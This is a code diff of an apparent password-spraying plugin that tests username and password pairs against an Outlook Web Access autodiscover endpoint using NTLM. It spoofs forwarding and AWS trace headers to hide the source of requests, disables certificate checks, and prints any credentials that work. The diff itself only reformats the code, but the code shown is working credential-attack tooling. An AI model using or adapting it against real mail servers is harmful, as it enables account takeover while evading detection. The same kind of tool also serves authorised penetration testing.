@@ -3,10 +3,11 @@ from requests_ntlm import HttpNtlmAuth
 import utils.utils as utils
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
+
 def owa_authenticate(url, username, password, useragent, pluginargs):
 
     data_response = {
-        'result': None,    # Can be "success", "failure" or "potential"
+        'result' : None,    # Can be "success", "failure" or "potential"
         'error': False,
         'output' : "",
         'valid_user' : False
@@ -17,19 +18,19 @@ def owa_authenticate(url, username, password, useragent, pluginargs):
     trace_id = utils.generate_trace_id()
 
     headers = {
-        'User-Agent': useragent,
+        'User-Agent' : useragent,
         "X-My-X-Forwarded-For" : spoofed_ip,
         "x-amzn-apigateway-api-id" : amazon_id,
         "X-My-X-Amzn-Trace-Id" : trace_id,
 
-        "Content-Type": "text/xml"
+        "Content-Type" : "text/xml"
     }
 
     headers = utils.add_custom_headers(pluginargs, headers)
 
     try:
 
-        resp = requests.get("{}/autodiscover/autodiscover.xml".format(url), headers=headers, auth=HttpNtlmAuth(username, password), verify=False)
+        resp = requests.get(f"{url}/autodiscover/autodiscover.xml", headers=headers, auth=HttpNtlmAuth(username, password), verify=False)
 
         if resp.status_code == 200:
             data_response['output'] = f"[+] SUCCESS: Found credentials: {username}:{password}"
